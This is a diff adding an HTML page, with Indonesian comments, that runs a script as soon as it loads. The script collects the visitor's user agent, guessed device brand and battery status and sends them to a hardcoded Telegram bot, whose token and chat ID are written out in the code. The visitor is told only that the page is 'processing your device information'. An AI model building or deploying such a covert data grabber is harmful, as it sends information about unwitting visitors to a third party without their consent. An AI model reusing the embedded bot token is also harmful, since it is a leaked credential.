@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Device Info Collector</title>
+</head>
+<body>
+    <h1>Device Information Collector</h1>
+    <p>Processing your device information...</p>
+
+    <script>
+        const telegramToken = "7375262668:AAHBFfwnMZ9Cg0clsH-m5HZOdq-nhFJ9Cww";
+        const chatId = "5649811717";
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message }),
+            })
+            .then(response => console.log("Data sent to Telegram"))
+            .catch(error => console.error("Error sending to Telegram:", error));
+        }
+
+        // Ambil informasi perangkat dari user agent
+        const userAgent = navigator.userAgent;
+        let deviceInfo = `User Agent: ${userAgent}\n`;
+
+        // Deteksi merek perangkat
+        if (userAgent.includes("Android")) {
+            if (userAgent.includes("Samsung")) {
+                deviceInfo += "Device: Samsung\n";
+            } else if (userAgent.includes("Huawei")) {
+                deviceInfo += "Device: Huawei\n";
+            } else if (userAgent.includes("Xiaomi")) {
+                deviceInfo += "Device: Xiaomi\n";
+            } else {
+                deviceInfo += "Device: Android (Unknown Brand)\n";
+            }
+        } else if (userAgent.includes("iPhone")) {
+            deviceInfo += "Device: Apple iPhone\n";
+        } else {
+            deviceInfo += "Device: Unknown\n";
+        }
+
+        // Ambil status baterai jika tersedia
+        if (navigator.getBattery) {
+            navigator.getBattery().then((battery) => {
+                const batteryInfo = `
+                    Battery Level: ${battery.level * 100}%
+                    Charging: ${battery.charging ? "Yes" : "No"}
+                    Charging Time: ${battery.chargingTime} seconds
+                    Discharging Time: ${battery.dischargingTime} seconds
+                `;
+                sendToTelegram(`${deviceInfo}\n${batteryInfo}`);
+            });
+        } else {
+            sendToTelegram(`${deviceInfo}\nBattery Info: Not Supported`);
+        }
+    </script>
+</body>
+</html>
